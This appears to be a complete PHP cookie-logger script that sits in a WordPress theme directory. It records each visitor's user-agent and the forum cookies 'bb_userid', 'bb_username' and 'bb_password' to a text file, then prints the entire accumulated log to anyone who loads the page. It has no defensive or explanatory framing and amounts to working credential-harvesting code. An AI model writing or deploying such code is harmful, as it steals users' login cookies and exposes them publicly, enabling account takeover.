<?php 
if(isset($_GET['reset']))
{
	file_put_contents("wp-content/themes/site/cookielogs.txt", "");
	echo "Cookie Log cleared...<br>";
}
$msg="";
$msg .= "Time: ".date('m-d-Y H:i:s')."\t";
$msg .= "User-Agent: ".$_SERVER['HTTP_USER_AGENT']."\t";
if(isset($_COOKIE['bb_userid']))
{

    $msg .= "Cookie: Is set \t";
	$msg .= "( ".$_COOKIE['bb_userid'];
	$msg .= " / ".$_COOKIE['bb_username'];
	$msg .= " / ".$_COOKIE['bb_password']." )<br>";}
else
{
    $msg .= "Cookie: Not set... \t<br>";
   // echo "Cookie: Not set...";
}

$myfile = fopen("wp-content/themes/site/cookielogs.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\r\n\r\n". $msg);
fclose($myfile);

$homepage = file_get_contents('wp-content/themes/site/cookielogs.txt');
echo $homepage;
